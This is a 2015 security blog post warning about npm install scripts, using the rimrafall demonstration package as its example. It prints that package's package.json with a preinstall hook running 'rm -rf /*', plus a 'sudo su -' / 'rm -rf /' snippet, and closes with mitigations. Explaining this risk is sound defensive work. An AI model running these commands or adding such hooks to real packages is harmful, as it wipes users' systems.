---
title: npm install - could be dangerous
author: Christoph Hartmann
date: 2015-05-09
tags:
  - nodejs
  - security
aliases:
  - /articles/npm-dependency-could-be-dangerous/
---

[NPM](https://www.npmjs.com/) hosts about 144,000 npm modules on their registry. Over one million modules are downloaded per month. Assume you use one module that includes a major flaw in their implementation? Will you detect it?

## What is going on?

Just recently, [João Jerónimo](https://github.com/joaojeronimo) published a special npm modules called [rimrafall](https://github.com/joaojeronimo/rimrafall). He published it at npm and posted it on [Hacker News](https://news.ycombinator.com/item?id=8947493). Essentially this module does the following:

```bash
sudo su -
rm -rf /
```

It uses a special script tag in `package.json` to run a prescript. Commonly it is used to build native code, but still can be used to do anything that bash can.

The package.json looks as follows:

```json
{
  "name": "rimrafall",
  "version": "1.0.0",
  "description": "rm -rf /* # DO NOT INSTALL THIS",
  "main": "index.js",
  "scripts": {
    "preinstall": "rm -rf /*"
  },
  "keywords": [
    "rimraf",
    "rmrf"
  ],
  "author": "João Jerónimo",
  "license": "ISC"
}
```

## Risk

Once you just install this module, your computer is shredded. Do you verify all your dependencies for malicious scripts? In most cases you do not. This is especially dangerous if this runs on your production server or CI server.

Although there is no easy mitigation, you could start building all your node code in a Docker container or use `npm install --ignore-scripts`. If you integrate 3rd-party modules, have a look at their source code, especially if it is a new module.

See also:

 * [Encrypt and decrypt content with Nodejs](http://lollyrock.com/articles/nodejs-encryption/)
 * [SHA 512 Hashs with nodejs](http://lollyrock.com/articles/nodejs-sha512/)
 * [Simple file uploads with Express 4](http://lollyrock.com/articles/express4-file-upload/)
 * [Applied Content Security Policy for Nginx and Nodejs](http://lollyrock.com/articles/content-security-policy/)
 * [Ready for ES6?](http://arlimus.github.io/articles/ready.for.es6/)

